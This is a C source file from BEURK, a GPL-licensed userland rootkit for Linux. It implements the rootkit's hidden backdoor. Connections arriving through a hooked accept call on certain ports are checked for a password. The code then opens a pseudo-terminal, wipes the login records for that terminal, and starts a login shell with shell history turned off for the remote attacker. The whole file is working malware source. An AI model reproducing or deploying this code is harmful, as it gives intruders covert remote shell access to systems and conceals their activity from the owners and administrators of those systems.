/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <pty.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include "beurk.h"


/** ensure that given password is valid.
 */
static int  check_shell_password(int sock) {
    DEBUG(D_INFO, "check_shell_password() called.");

    char    buffer[sizeof(PASSWORD)] = {0};

    if (read(sock, buffer, sizeof(buffer) - 1) < 0)
    {
        DEBUG(D_ERROR, "read(): %s", strerror(errno));
        return -1;
    }

    DEBUG(D_INFO, "backdoor password = '%s'", buffer);

    if (strncmp(buffer, PASSWORD, strlen(PASSWORD)) != 0)
        return (-1);
    return (1);
}


/** close backdoor socket properly and return -1.
 */
static int  close_socket(int sock) {
    shutdown(sock, SHUT_RDWR);
    close(sock);
    return (-1);
}


/** execute a login shell process
 */
static void start_interactive_shell(int sock, int *pty, int *tty) {
    DEBUG(D_INFO, "start_interactive_shell() called");

    char * const args[] = {SHELL_TYPE, "-l", NULL};
    char * const env[] = {_ENV_IS_ATTACKER, _ENV_NO_HISTFILE, _ENV_XTERM, NULL};

    /* close all file descriptors (prevent inheritance) */
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    close(*pty);
    close(sock);

    /* be session group leader and request a new tty */
    setsid();
    ioctl(*tty, TIOCSCTTY);

    /* use tty as standard file descriptors */
    dup2(*tty, STDIN_FILENO);
    dup2(*tty, STDOUT_FILENO);
    dup2(*tty, STDERR_FILENO);

    execve(args[0], args, env);
    DEBUG(D_ERROR, "failed to execve `%s %s`: %s",
            args[0], args[1], strerror(errno));
}


/** Continuously run pipes for dropped shell
 */
#define SLOOP_BUF_SIZE (4094 + 31) /* why this buf size ? */
static void shell_loop(int sock, int pty) {
    DEBUG(D_INFO, "shell_loop() called");

    fd_set  fds;
    char    buf[SLOOP_BUF_SIZE];
    int     res;
    int     nfds;

    nfds = (sock > pty) ? sock : pty;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        FD_SET(pty, &fds);

        if (select(nfds + 1, &fds, NULL, NULL, NULL) < 0) {
            DEBUG(D_ERROR, "shell_loop(): select() failed",
                    strerror(errno));
            exit(1);
        }
        if (FD_ISSET(sock, &fds)) {
            memset(&buf, 0, SLOOP_BUF_SIZE);
            if ((res = read(sock, buf, SLOOP_BUF_SIZE)) <= 0) {
                DEBUG(D_ERROR, "shell_loop(): couldn't read from client: %s",
                        strerror(errno));
                exit(1);
            }
            else
                write(pty, buf, res);
        }
        if (FD_ISSET(pty, &fds)) {
            memset(&buf, 0, SLOOP_BUF_SIZE);
            if ((res = read(pty, buf, SLOOP_BUF_SIZE - 31)) <= 0) {
                DEBUG(D_ERROR, "shell_loop(): couldn't read from pty: %s",
                        strerror(errno));
                exit(1);
            }
            else
                write(pty, buf, res);
        }
    }
}


/** this function starts and handles pty stream between
 * server and attacker's backdoor client.
 */
static int  drop_pty_connection(int sock) {
    DEBUG(D_INFO, "drop_pty_connection() called");

    int     pty, tty;
    char    pty_name[5 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"

    /* open a pty and cleanup log entries */
    if (openpty(&pty, &tty, pty_name, NULL, NULL) < 0) {
        DEBUG(D_ERROR, "openpty(): %s", strerror(errno));
        return (close_socket(sock));
    }
    DEBUG(D_INFO, "pty_name = '%s'", pty_name);
    cleanup_login_entries(basename(pty_name));

    /* start interactive shell on a child process */
    switch (fork()) {
        case 0:
            start_interactive_shell(sock, &pty, &tty);
        case -1:
            DEBUG(D_ERROR, "fork(): %s", strerror(errno));
            close_socket(sock);
            close(tty);
            return (-1);
        default:
            close(tty);
    }

    /* run pipes for the shell on another child process */
    switch (fork()) {
        case 0:
            shell_loop(sock, pty);
        case -1:
            DEBUG(D_ERROR, "fork(): %s", strerror(errno));
        default:
            close_socket(sock);
            close(pty);
            errno = ECONNABORTED;
            return (-1);
    }
}


/** serve a pty backdoor to remote attacker.
 *
 * this hidden function is called by accept(2) hook.
 */
int         drop_shell_backdoor(int sock, struct sockaddr *addr) {
    DEBUG(D_INFO, "drop_backdoor_shell() called.");

    struct sockaddr_in *sa_in;
    uint16_t sin_port;

    sa_in = (struct sockaddr_in*) addr;
    sin_port = htons(sa_in->sin_port);

    if (sin_port < LOW_BACKDOOR_PORT || sin_port > HIGH_BACKDOOR_PORT)
        return sock;

    if (check_shell_password(sock) < 0)
        return (close_socket(sock));

    if (write(sock, SHELL_MOTD, strlen(SHELL_MOTD)) < 0) {
        DEBUG(D_ERROR, "write(): %s", strerror(errno));
        return (close_socket(sock));
    }

    return drop_pty_connection(sock);
}
